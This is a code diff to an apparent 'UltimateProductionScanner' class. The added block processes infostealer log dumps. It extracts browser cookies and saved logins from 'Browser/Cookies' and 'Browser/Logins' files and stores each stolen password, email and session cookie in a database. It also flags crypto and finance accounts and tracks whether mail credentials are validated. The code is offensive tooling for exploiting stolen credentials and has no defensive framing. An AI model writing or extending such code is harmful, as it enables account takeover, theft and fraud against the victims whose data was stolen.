@@ -4214,6 +4214,55 @@ class UltimateProductionScanner:
                             
                             # 2. Credentials extraction (ALWAYS - Fast)
                             if opts.get('extract_credentials', True):
+                                # Extract credentials from file
+                                content = self._read_file_safe(file_path)
+                                if content:
+                                    filename = os.path.basename(file_path).lower()
+                                    
+                                    # Extract cookies from Netscape format
+                                    if 'cookie' in filename or 'Browser/Cookies' in file_path:
+                                        cookies = self.extract_cookies_netscape(content)
+                                        for cookie in cookies:
+                                            self.db.add_cookie({
+                                                'domain': cookie['domain'],
+                                                'name': cookie['name'],
+                                                'value': cookie['value'],
+                                                'browser': 'Unknown',
+                                                'wallet_site': cookie['domain'],
+                                                'is_valid': True
+                                            })
+                                            self.stats['cookies_found'] += 1
+                                    
+                                    # Extract logins from Browser/Logins files
+                                    if 'login' in filename or 'Browser/Logins' in file_path or 'password' in filename:
+                                        logins = self.extract_logins_from_stealer(content)
+                                        for login in logins:
+                                            self.db.add_credential({
+                                                'browser': 'unknown',
+                                                'profile': 'unknown',
+                                                'url': login['url'],
+                                                'email': login['username'],
+                                                'password': login['password'],
+                                                'website': login['url'],
+                                                'category': login['category'],
+                                                'is_crypto': login['category'] == 'finance',
+                                                'is_premium': False,
+                                                'has_sms_gateway': False,
+                                                'smtp_validated': False,
+                                                'imap_validated': False,
+                                                'source_file': file_path
+                                            })
+                                            self.stats['credentials_found'] += 1
+                                    
+                                    # Extract general credentials
+                                    credentials = self._extract_credentials_aggressive(content, file_path)
+                                    for cred in credentials:
+                                        self.db.add_credential(cred)
+                                        self.stats['credentials_found'] += 1
+                                        if self.stats['credentials_found'] % 10 == 0:  # Log every 10th
+                                            self.live_feed.log(f"🔐 CREDENTIAL: {cred.get('email', 'N/A')}", "info")
+                                
+                                # Website and social media extraction
                                 website_extractor.extract_website_access(file_path)
                                 social_hunter.hunt_social_media(file_path)
                             
